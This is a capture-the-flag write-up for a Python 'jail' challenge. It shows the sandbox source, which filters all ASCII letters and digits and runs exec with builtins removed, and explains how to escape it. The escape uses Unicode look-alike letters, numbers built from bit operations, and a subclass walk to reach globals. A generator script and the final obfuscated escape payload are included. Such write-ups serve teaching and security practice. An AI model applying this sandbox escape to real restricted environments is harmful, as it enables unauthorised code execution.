# python-jail-harder

## problem

see [./Dockerfile](./Dockerfile)

```py
#!/usr/bin/env python 

blacklist = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

security_check = lambda s: any(c in blacklist for c in s) or s.count('_') > 50

def main():
    while True: 
        cmds = input("> ")
        if security_check(cmds):
            print("nope.")
        else:
            exec(cmds, {'__builtins__': None}, {})
    

if __name__ == "__main__":
    main()
```

## solution

compared to the regular python-jail, this one fixes the vulnerability by using `or` instead of `and`

to bypass this, we can use non-ascii character (unicode) because they are not equal to any characters in the blacklist but still execute in `exec` as if they were ascii characters. 

so for example, `ᵖʳᵢⁿᵗ(1+2+3)` would execute the same as `print(1+2+3)` assuming builtins exists. there are different unicode symbols for all of the letters, uppercase and lowercase. 
the only issue is that the strings will evaluate differently (`"ᵖʳᵢⁿᵗ" != "print"` assuming builtins exists)

therefore, we can use list and dictionary indexes instead (dictionary can be indexed using `[].__class__(dictionary.values())` which returns a list of values in the same order). 

however, there is still the issue of getting numbers because there aren't any unicode symbols that i could find for numbers that work.
however, this can be done easily by using `[].__len__()` which is 0. keep in mind that `len([])` can't be possible because `len` is part of builtins, and builtins isn't in the global scope.

well, that's only the number 0. to get any other number, we can make use of the `~` operator and bit shifting. to get 1, we can do `-~[].__len__()`. this is equivalent to `-(~(0))`. the `~` operator flips all the bits (including sign bit) which causes 0 to become -1.
then, using the unary minus operator gets us 1 from 0. then, it is very easy to bit shift and use the or operator to get any desired number. 
in the payload below, i have `a` as one to reduce the amount of underscores necessary (exec means multiple statements can be used), and this helps bypass the limit of 50 underscores max.

the final payload looked something like this:

```py
m = {}
for _ in range(32, 0x200ff):
    letter = chr(_)
    try:
        eval(letter)
    except NameError as e:
        m[letter] = str(e).split("'")[1]
    except SyntaxError:
        pass
    except UnicodeEncodeError:
        pass

blocked = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

m2 = {}
for k in m:
    if m[k] in blocked and m[k] != k:
        if m[k] not in m2:
            m2[m[k]] = k

m2["m"] = "ᵐ"

payload = """
a=-~[].__len__()
b=[].__class__(().__class__.__base__.__subclasses__()[-(a+a+a+a+a)].__init__.__globals__.values())
b[-(a<<(a+a+a+a+a+a+a+a)|a<<(a+a+a+a+a+a)|a<<(a+a+a+a)|a<<(a+a))](b[a][a<<(a+a+a)|(a+a)]+b[a][-((a<<(a+a+a+a+a))-a-a-a-a-a-a)])
""".rstrip("\n").lstrip("\n").replace("\n", ";")
total = ""
for letter in payload:
    if letter in blocked:
        total += m2[letter]
    else:
        total += letter
print(total)
```

this printed the following payload: 
```
ª=-~[].__ˡᵉⁿ__();ᵇ=[].__ᶜˡªſſ__(().__ᶜˡªſſ__.__ᵇªſᵉ__.__ſᵘᵇᶜˡªſſᵉſ__()[-(ª+ª+ª+ª+ª)].__ᵢⁿᵢᵗ__.__ᵍˡºᵇªˡſ__.ᵛªˡᵘᵉſ());ᵇ[-(ª<<(ª+ª+ª+ª+ª+ª+ª+ª)|ª<<(ª+ª+ª+ª+ª+ª)|ª<<(ª+ª+ª+ª)|ª<<(ª+ª))](ᵇ[ª][ª<<(ª+ª+ª)|(ª+ª)]+ᵇ[ª][-((ª<<(ª+ª+ª+ª+ª))-ª-ª-ª-ª-ª-ª)])
```

what also helped was setting up a docker container with the correct environment but slightly modified to make `"builtins": None` into `"builtins": {"print": print}` which allowed for printing for debugging purposes. 
also removing the security check temporarily made the process much easier
